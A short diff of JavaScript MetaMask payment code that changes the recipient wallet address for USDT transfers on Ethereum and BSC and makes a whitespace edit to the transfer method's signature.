@@ -8,14 +8,14 @@ const MetaMaskChainAbiMap = {
     '1': {
       contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       abi: ERC_abi,
-      toAddress: '0xe4F13c05FdBF3Fa8149b8980742f0E7e9E4749eC',
+      toAddress: '0xeC4B76ef0F79bc8FEeE9c5C10bc711EEe1e423D2',
       decimals: 6,
       chainId: "1"
     },
     '56': {
       contractAddress: '0x55d398326f99059fF775485246999027B3197955',
       abi: BSC_abi,
-      toAddress: '0xe4F13c05FdBF3Fa8149b8980742f0E7e9E4749eC',
+      toAddress: '0xeC4B76ef0F79bc8FEeE9c5C10bc711EEe1e423D2',
       decimals: 18,
       chainId: "56"
     },
@@ -132,7 +132,7 @@ class MetaMaskWallet {
         return {amount: amount};
     }
     
-    transfer = async (address, price, successcallback, failedcallback) => {
+    transfer = async (address,price, successcallback, failedcallback) => {
         const contract = await this.initContract();
         const chainInfo = await this.getChainInfo();
         const { toAddress, decimals } = chainInfo
